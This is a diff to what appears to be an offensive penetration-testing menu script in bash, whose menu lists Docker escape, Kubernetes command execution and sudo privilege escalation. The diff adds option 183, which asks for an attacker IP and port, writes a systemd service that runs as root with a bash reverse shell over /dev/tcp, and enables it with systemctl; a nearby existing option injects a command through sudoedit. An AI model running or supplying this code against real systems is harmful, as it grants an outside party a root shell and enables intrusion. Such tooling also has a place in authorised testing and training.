@@ -114,7 +114,7 @@ while true; do
 	echo -ne " 168. search keywords inside files in specific folder\t\t\t\t\t169. dump keys from memcached\n"
 	echo -ne " 171. escape from Docker method 1\t\t\t174. extract a tar.gz file\n"
 	echo -ne " 177. use Kubernetes exploit for Local Command Execution\t\t\t\t178. analyze an executable file with strace and ltrace\n"
-	echo -ne " 182. PrivEsc with sudoedit\n"
+	echo -ne " 182. PrivEsc with sudoedit\t\t\t\t183. PrivEsc by revshell with root priv using systemctl\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -766,6 +766,20 @@ while true; do
 		if [[ "$CMD" != "" ]];
 		then
 			sudoedit -s '\' `$CMD`
+		fi
+	;;
+	"183")
+		echo "Digit your IP"
+		read -p "(example, 10.11.12.13): " MIP
+		if [[ "$MIP" != "" ]];
+		then
+			echo "Digit your PORT"
+			read -p "(example, 4444): " MPRT
+			if [[ "$MPRT" != "" ]];
+			then
+				echo -ne "[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/""$MIP""/""$MPRT"" 0>&1'\n\n[Install]\nWantedBy=multi-user.target\n" >test.service
+				systemctl enable ./test.service
+			fi
 		fi
 	;;
 	*)
